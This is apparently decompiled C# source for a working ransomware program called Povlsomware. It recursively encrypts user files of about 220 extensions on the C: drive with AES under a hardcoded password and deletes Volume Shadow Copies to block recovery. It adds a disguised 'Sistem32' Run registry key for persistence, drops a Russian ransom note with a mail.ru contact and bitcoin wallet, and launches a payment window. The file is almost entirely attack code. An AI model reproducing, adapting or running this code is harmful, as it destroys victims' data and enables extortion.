using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Povlsomware;

internal class Program
{
	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static readonly string password = "udfzlcnc89ec0";

	private static readonly string[] extensionsToEncrypt = new string[220]
	{
		".png", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg",
		".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
		".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".zip",
		".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6",
		".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs",
		".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo",
		".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu",
		".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf",
		".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl",
		".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb",
		".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset",
		".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk",
		".rgss3a", ".pak", ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv",
		".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".cf", ".cfu",
		".cfe", ".dt", ".epf", ".1cd", ".cdn", ".mxl", ".grs", ".crt", ".cer", ".der",
		".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", ".raw", ".raf", ".orf",
		".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2",
		".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps",
		".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg",
		".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx",
		".xls", ".wps", ".docm", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".cs",
		".exe", ".lnk", ".mpeg", ".mp3", ".mkv", ".divx", ".ogg", ".wav", ".bat", ".index"
	};

	[STAThread]
	public static string GetPass()
	{
		return password;
	}

	private static void Main()
	{
		Attack();
		DestroyCopy();
		SetStartup();
		CreateUI();
	}

	private static void SetStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("Sistem32") == null && !Application.get_ExecutablePath().Contains("rundll32.exe"))
		{
			registryKey.SetValue("Sistem32", "\"" + Application.get_ExecutablePath() + "\"");
		}
	}

	private static void CreateUI()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		PayM3 payM = new PayM3();
		Application.Run((Form)(object)payM);
	}

	public static void DecryptFile(string fileEncrypted, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted).Skip(4).ToArray();
		byte[] array = AES_Decrypt(bytesToBeDecrypted, bytes);
		FileStream fileStream = File.Open(fileEncrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine("Decrypted: " + fileEncrypted);
	}

	public static void DestroyCopy()
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Наши контакты.txt");
		File.WriteAllText(path, "revilsapport@mail.ru почта для связи с нами;  bc1qcmzxqunjy4jdprpz475kaprghgfnxqk9856zz5  номер нашего биткоин кошелька;  YenYeBTpde ваш индификатор.");
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
			flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (!flag)
		{
			return;
		}
		string text = "\\\\.\\ROOT\\cimv2";
		string text2 = "Win32_ShadowCopy";
		ManagementClass val = new ManagementClass(text + ":" + text2);
		ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				val2.Delete();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void EncryptFile(string fileUnencrypted)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeEncrypted = File.ReadAllBytes(fileUnencrypted);
		byte[] array = AES_Encrypt(bytesToBeEncrypted, bytes);
		FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("P0vL");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine("Encrypted: " + fileUnencrypted);
			count++;
			encryptedFiles.Add(fileUnencrypted);
		}
	}

	public static void Attack()
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 1, "");
	}

	public static void UndoAttack(string decryption_password)
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 0, decryption_password);
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
		IEnumerable<string> enumerable = from file in Directory.EnumerateFiles(targetDirectory, "*.*")
			where extensionsToEncrypt.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
			select file;
		foreach (string item in enumerable)
		{
			ProcessFile(item, action, password);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		string[] array = directories;
		foreach (string text in array)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows") && !text.Contains("C:\\Program Files") && !text.Contains("Temporary Internet Files") && !text.Contains("AppData\\") && !text.Contains("\\source\\") && !text.Contains("C:\\ProgramData\\") && !text.Contains("\\Povlsomware-master\\") && !text.Contains("\\Povlsomware\\"))
				{
					ProcessDirectory(text, action, password);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("P0vL");
		byte[] second = File.ReadAllBytes(fileName).Take(4).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
		if (action == 1 && !IsMarked(fileName))
		{
			try
			{
				EncryptFile(fileName);
				return;
			}
			catch
			{
				return;
			}
		}
		if (action == 0 && IsMarked(fileName))
		{
			try
			{
				DecryptFile(fileName, password);
			}
			catch
			{
			}
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}
}
